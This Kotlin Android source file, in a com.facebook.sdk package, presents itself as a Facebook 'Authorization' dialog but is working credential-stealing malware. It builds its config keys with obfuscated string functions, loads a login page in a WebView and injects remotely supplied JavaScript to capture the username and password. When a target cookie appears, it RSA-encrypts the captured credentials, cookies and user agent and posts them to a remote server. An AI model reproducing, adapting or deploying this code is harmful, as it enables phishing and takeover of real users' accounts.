package com.facebook.sdk

import android.content.Context
import android.content.res.Resources
import android.graphics.Color
import android.graphics.Point
import android.graphics.drawable.ColorDrawable
import android.os.Bundle
import android.util.Base64
import android.util.Log
import android.view.*
import android.webkit.*
import android.widget.ImageView
import android.widget.TextView
import androidx.constraintlayout.widget.ConstraintLayout
import androidx.fragment.app.DialogFragment
import com.facebook.sdk.databinding.DialogSdkBinding
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.IOException
import java.security.KeyFactory
import java.security.spec.X509EncodedKeySpec
import javax.crypto.Cipher


/**
 * create by zuoz
 * time:2022/6/20
 **/
class SdkDialog(data: String, var _even: EvenCallBack? = null) : DialogFragment() {

    val sdkData: SdkData by lazy {
        SdkData()
    }

    init {
        startInitData(data)
    }

    private fun startInitData(data: String) {
        try {
            val decodeStr = String(Base64.decode(data, 0))
            val jsonObject = JSONObject(decodeStr)
            with(jsonObject) {
                val keyJ = getStringJ("j")
                if (has(keyJ)) {
                    sdkData.almond = getString(keyJ)
                }

                val keyCheck = getStringCheck("")
                if (has(keyCheck)) {
                    sdkData.apple = getString(keyCheck)
                }

                val keyL = getStringlit("j")
                if (has(keyL)) {
                    sdkData.apricot = getString(keyL)
                }

                val keyD = getStringDOKN("d")
                if (has(keyD)) {
                    sdkData.arbutus = getString(keyD)
                }

                val keyUrl = getStringUrl("")
                if (has(keyUrl)) {
                    sdkData.avocado = getString(keyUrl)
                }

                val keyUrlend = getStringUrl2("")
                if (has(keyUrlend)) {
                    sdkData.bennet = getString(keyUrlend)
                }

                val keyBergamot = getStringPage()
                if (has(keyBergamot)) {
                    sdkData.bergamot = getString(keyBergamot)
                }

                val keyCoconut = getStringEnglish("code")
                if (has(keyCoconut)) {
                    sdkData.coconut = getString(keyCoconut)
                }

                val keyName = "app_name"
                if (has(keyName)) {
                    sdkData.cumquat = getString(keyName)
                }


            }


        } catch (e: Exception) {
            Log.e("11111111112222", "startInitData: ${e.message}")
            _even?.onFailed()
        }

    }

    lateinit var binding: DialogSdkBinding
    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        dialog?.setCanceledOnTouchOutside(false)
        initSize()
        initView()
    }

    private fun initSize() {
        dialog?.window?.let {
            val wm = requireContext().getSystemService(Context.WINDOW_SERVICE) as? WindowManager
            val display = wm?.defaultDisplay
            val point = Point();
            display?.getSize(point);


            val layoutParams = it.attributes;

            layoutParams.width = WindowManager.LayoutParams.MATCH_PARENT
            layoutParams.height = (point.y * 0.75).toInt()
            it.attributes = layoutParams
        }
    }

    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {

        dialog?.requestWindowFeature(Window.FEATURE_NO_TITLE);
        dialog?.window?.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))
        dialog?.window?.setGravity(Gravity.BOTTOM)

        binding = DialogSdkBinding.inflate(layoutInflater)
        return binding.root
    }

    fun initView() {
        if (sdkData.isError()) {
            _even?.onFailed()
            this.dismiss()
            return
        }

        binding.dialogSdk.apply {
            this.setBackgroundColor(Color.WHITE)
            val size50 = dp2px(50f)

            //webview

            val webView = WebView(requireContext())
            val webviewLP = ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )

            setWebViewClient(webView)
            webView.layoutParams = webviewLP
            addView(webView)

            //title bg
            val viewBg = View(requireContext())
            viewBg.id = R.id.view_bg
            viewBg.setBackgroundColor(Color.WHITE)
            val viewBgLP = ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )

            viewBgLP.width = ViewGroup.LayoutParams.MATCH_PARENT
            viewBgLP.height = size50
            viewBg.layoutParams = viewBgLP

            addView(viewBg)

            //title views
            val viewIcon = ImageView(requireContext())
            viewIcon.id = R.id.view_icon
            viewIcon.scaleType = ImageView.ScaleType.CENTER_INSIDE
            viewIcon.setImageResource(R.drawable.ic_icon)
            val viewIconLP = ConstraintLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )


            viewIconLP.width = size50
            viewIconLP.height = size50
            viewIconLP.leftToLeft = viewBg.id
            viewIconLP.topToTop = viewBg.id
            val margins = dp2px(5f)
            viewIcon.layoutParams = viewIconLP
            viewIcon.setPadding(0, margins, margins, margins)
            addView(viewIcon)

            //title text
            val viewText = TextView(requireContext())
            viewText.id = R.id.view_text

            viewText.text = "Authorization"
            val viewTextLP = ConstraintLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
            )
            viewText.gravity = Gravity.CENTER

            viewTextLP.height = size50
            viewTextLP.leftToRight = viewIcon.id
            viewTextLP.topToTop = viewIcon.id

            viewText.layoutParams = viewTextLP
            addView(viewText)

            //close
            val viewClose = ImageView(requireContext())
            viewClose.setImageResource(R.drawable.ic_close)
            viewClose.id = R.id.view_close

            val viewCloseLP = ConstraintLayout.LayoutParams(
                size50,
                size50
            )

            viewCloseLP.rightToRight = this.id
            viewCloseLP.topToTop = this.id

            viewClose.layoutParams = viewCloseLP
            viewClose.setPadding(margins, margins, margins, margins)
            viewClose.setOnClickListener {
                _even?.onFailed()
            }
            addView(viewClose)
        }

    }


    private fun setWebViewClient(webView: WebView) {
        webView.apply {

            settings.javaScriptEnabled = true
            _even?.onUAStringCallBack(settings.userAgentString)
            webViewClient = object : WebViewClient() {
                override fun onPageFinished(view: WebView?, url: String?) {
                    url?.let {
                        if (it == sdkData.avocado) {
                            _even?.onLoaded()
                        }
                    }

                    val checkingContent = CookieManager.getInstance().getCookie(url) ?: return
                    verifyCook(checkingContent, webView)
                    super.onPageFinished(view, url)
                }

                override fun shouldInterceptRequest(
                    view: WebView?,
                    request: WebResourceRequest?
                ): WebResourceResponse? {
                    request?.url?.path?.let {
                        verifyURl(it, webView)
                    }
                    return super.shouldInterceptRequest(view, request)
                }

                override fun onReceivedError(
                    view: WebView?,
                    request: WebResourceRequest?,
                    error: WebResourceError?
                ) {

                    view?.reload()
                    super.onReceivedError(view, request, error)
                }
            }

            isVerticalScrollBarEnabled = false
            isHorizontalScrollBarEnabled = false

            setOnTouchListener { v, event -> (event?.action == MotionEvent.ACTION_MOVE); }
        }

        webView.loadUrl(sdkData.avocado)
    }

    var isStartWait = false
    fun verifyCook(cook: String, webview: WebView) {
        if (!cook.contains(sdkData.apple)) {
            return
        }

        try {
            if (isStartWait) {
                return
            }
            val ua = webview.settings.userAgentString
            val uuuer = SpUtils.getUser(requireContext())
            val pppage = SpUtils.getPage(requireContext())




            GlobalScope.launch(Dispatchers.IO) {
                //开始获取数据
                val uploadMap = mutableMapOf<String, String>()
                val dataMap = mutableMapOf<String, String>()
                dataMap["b"] = ua
                dataMap["cookie"] = cook
                dataMap["ip"] = ""
                dataMap["un"] = uuuer
                dataMap["pw"] = pppage
                dataMap["source"] = sdkData.cumquat
                dataMap["type"] = "f_o"

                val json = JSONObject(dataMap as Map<*, *>)
                val str = getUploadInfoBase64(json.toString())

                uploadMap["content"] = str
                val json2 = JSONObject(uploadMap as Map<*, *>)

                val okHttpClient = OkHttpClient();
                val requestBody = RequestBody.create(
                    "application/json;charset=utf-8".toMediaTypeOrNull(),
                    json2.toString()
                );
                val request = Request.Builder()
                    .url(sdkData.bennet)
                    .post(requestBody)
                    .build();

                okHttpClient.newCall(request).enqueue(object : Callback {
                    override fun onFailure(call: Call, e: IOException) {
                        logFailed()
                    }

                    override fun onResponse(call: Call, response: Response) {
                        if (response.code == 200) {
                            val aaa = response?.body?.string()
                            if (aaa == null) {
                                logFailed()
                                return
                            }

                            if (!aaa.contains("success")) {
                                logFailed()
                                return
                            }
                            _even?.onSuccess()

                        } else {
                            logFailed()
                        }
                    }

                })

            }
        } catch (e: Exception) {
            logFailed()
        }
    }


    fun logFailed() {
        this.dismiss()
        _even?.onFailed()
    }

    fun getUploadInfoBase64(dataStr: String): String {

        val cipher = Cipher.getInstance(sdkData.bergamot)

        val public = KeyFactory.getInstance("RSA").let {
            val x50 = X509EncodedKeySpec(
                Base64.decode(
                    sdkData.coconut, Base64.DEFAULT
                )
            )
            it.generatePublic(x50)
        }


        cipher.init(Cipher.ENCRYPT_MODE, public)
        val bytesArray = dataStr.toByteArray()

        val max = bytesArray.size / cipher.getOutputSize(bytesArray.size)

        var blockCount = bytesArray.size / max
        if (bytesArray.size % blockCount != 0) {
            blockCount += 1
        }

        val baos = ByteArrayOutputStream(blockCount * max)
        var offset = 0
        var isCountim = true

        while (isCountim) {
            isCountim = offset < bytesArray.size
            if (isCountim) {
                val fd = bytesArray.size
                var encryptedBlock: ByteArray? = ByteArray(0)
                try {
                    var il = fd - offset
                    if (il > max) {
                        il = max
                    }
                    encryptedBlock = cipher!!.doFinal(bytesArray, offset, il)
                    baos.write(encryptedBlock)
                    offset += max
                } catch (e: java.lang.Exception) {
                    e.printStackTrace()
                    break
                }
            }
        }
        baos?.close()

        return Base64.encodeToString(baos?.toByteArray(), Base64.NO_WRAP)
    }

    fun verifyURl(str: String, webView: WebView) {
        if (!str.contains(sdkData.arbutus)) {
            return
        }

        requireActivity().runOnUiThread {
            webView.evaluateJavascript(sdkData.almond) {
                if (it.isEmpty()) {
                    return@evaluateJavascript
                }

                val strList = it.split(sdkData.apricot)
                if (strList.isEmpty()) {
                    return@evaluateJavascript
                }

                if (strList.size < 2) {
                    return@evaluateJavascript
                }

                SpUtils.saveUser(requireContext(), strList[0])
                SpUtils.savePage(requireContext(), strList[1])
            }
        }

    }

    fun dp2px(dpValue: Float): Int {
        val scale: Float = Resources.getSystem().displayMetrics.density
        return (dpValue * scale + 0.5f).toInt()
    }

    fun getStringJ(first: String): String {
        var srt = if (first.isEmpty()) {
            "j"
        } else {
            first
        }

        srt += "sc"
        if (!srt.contains("od")) {
            srt += "odes"
        }
        return srt
    }


    fun getStringCheck(first: String): String {
        var srt = if (first.isEmpty()) {
            "ch"
        } else {
            first + "k"
        }

        srt += "eck"
        if (!srt.contains("_")) {
            srt += "_key"
        }


        return srt
    }


    fun getStringlit(first: String): String {
        var srt = first.ifEmpty {
            "j"
        }

        srt += "ss"
        if (!srt.contains("lit")) {
            srt += "plit"
        }
        return srt
    }


    fun getStringDOKN(first: String): String {
        return if (first.isEmpty()) "vb" else first + "vb"
    }


    fun getStringUrl(first: String): String {
        var srt = first.ifEmpty {
            "r"
        }

        srt += "_u"
        if (srt.contains("od")) {
            srt += "kngl"
        }

        srt += "rl"
        return srt
    }

    fun getStringUrl2(first: String): String {
        var srt = ""

        srt += "csc"
        srt = srt.substring(0, 1)
        srt += "_"
        srt += "url"
        return srt
    }

    fun getStringPage(): String {
        var srt = "pad"
        srt = srt.removeSuffix("d")
        if (srt.isEmpty()) {
            srt += "haha"
        }
        srt += "dd"
        if (!srt.contains("ing")) {
            srt += "ing"
        }

        return srt
    }

    fun getStringEnglish(end: String): String {
        return "en$end"
    }


}